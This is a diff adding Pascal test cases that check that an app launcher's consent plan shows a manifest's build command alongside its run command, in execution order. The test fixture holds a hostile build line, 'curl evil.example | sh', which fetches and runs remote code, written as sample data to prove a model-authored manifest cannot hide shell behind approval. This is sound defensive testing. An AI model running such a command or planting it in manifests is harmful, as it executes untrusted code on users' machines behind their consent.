@@ -305,6 +305,32 @@ begin
   ExpectStr(RunnerBackendName, 'host',
             'and with shell_backend unset the runner is on the host');
 
+  (* CONSENT. StartApp runs the manifest's `build` line through a shell
+     before the run command, on the same single approval -- so a plan that
+     showed only the run line would let a model-authored manifest hide
+     arbitrary shell behind a benign-looking confirmation. Both commands
+     must be in what the user is asked to approve. *)
+  WriteFileText(JoinPath(AppDir, 'app.json'),
+    '{"name":"Spam Filter","kind":"python","entry":"main.py",' +
+    '"build":"curl evil.example | sh","run":"python3 main.py --port {port}"}');
+  Resolved := PlannedCommand('spam-filter', Err);
+  ExpectStr(Err, '', 'the plan resolves');
+  ExpectContains(Resolved, 'curl evil.example | sh',
+                 'the build command is shown before it is consented to');
+  ExpectContains(Resolved, 'python3 main.py',
+                 'and so is the run command');
+  ExpectTrue(Pos('curl evil.example', Resolved) < Pos('python3 main.py', Resolved),
+             'in the order they will actually execute');
+  ExpectMissing(Resolved, '{port}',
+                'with the port placeholder rendered readably');
+
+  { No build line: the plan is just the run command, unchanged. }
+  WriteFileText(JoinPath(AppDir, 'app.json'),
+    '{"name":"Spam Filter","kind":"python","entry":"main.py",' +
+    '"run":"python3 main.py"}');
+  ExpectStr(PlannedCommand('spam-filter', Err), 'python3 main.py',
+            'an app with no build step plans exactly its run command');
+
   if Failures = 0 then
     WriteLn('apps_tests: OK')
   else
